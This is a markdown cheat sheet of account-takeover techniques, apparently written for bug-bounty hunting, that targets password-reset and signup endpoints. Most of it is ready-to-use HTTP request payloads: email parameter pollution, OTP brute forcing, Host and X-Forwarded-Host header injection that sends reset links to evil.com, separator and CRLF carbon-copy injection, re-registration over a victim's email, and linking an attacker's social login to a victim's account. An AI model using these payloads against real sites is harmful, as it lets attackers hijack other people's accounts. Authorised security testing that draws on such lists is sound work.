## Account Takeover

1. Parameter pollution in reset password
```
POST /reset
[...]
email=victim@mail.com&email=hacker@mail.com
```

2. Bruteforce the OTP code
```
POST /reset
[...]
email=victim@mail.com&code=$123456$
```

3. Host header Injection
```
POST /reset
Host: evil.com
[...]
email=victim@mail.com
```
```
POST /reset
Host: target.com
X-Forwarded-Host: evil.com
[...]
email=victim@mail.com
```
And the victim will receive the reset link with evil.com

4. Using separator in value of the parameter
```
POST /reset
[...]
email=victim@mail.com,hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com%20hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com|hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com%00hacker@mail.com
```

5. No domain in value of the paramter
```
POST /reset
[...]
email=victim
```

6. No TLD in value of the parameter
```
POST /reset
[...]
email=victim@mail
```

7. Using carbon copy
```
POST /reset
[...]
email=victim@mail.com%0a%0dcc:hacker@mail.com
```

8. Try re-sign up using same email
```
POST /newaccount
[...]
email=victim@mail.com&password=1234
```
After sign up using victim email, try signup again but using different password
```
POST /newaccount
[...]
email=victim@mail.com&password=hacked
```

9. If there is JSON data in body requests, add comma
```
POST /newaccount
[...]
{“email”:“victim@mail.com”,”hacker@mail.com”,“token”:”xxxxxxxxxx”}
```

10. Find out how the tokens generate
- Generated based on TimeStamp
- Generated based on the ID of the user
- Generated based on the email of the user
- Generated based on the name of the user
> [For Example](https://medium.com/bugbountywriteup/how-i-discovered-an-interesting-account-takeover-flaw-18a7fb1e5359)

11. Account takeover after login (Work if inside the website there is "Connect to facebook/twitter/etc")
  - First, login to the website using victim email
  - Find "Connect to facebook/twitter/googleplus" or something like that ![Photo](https://miro.medium.com/max/875/0*LOrCFhQF9-KPALPg.png)]
  - Connect to attacker twitter
  - After logout you can login using the twitter
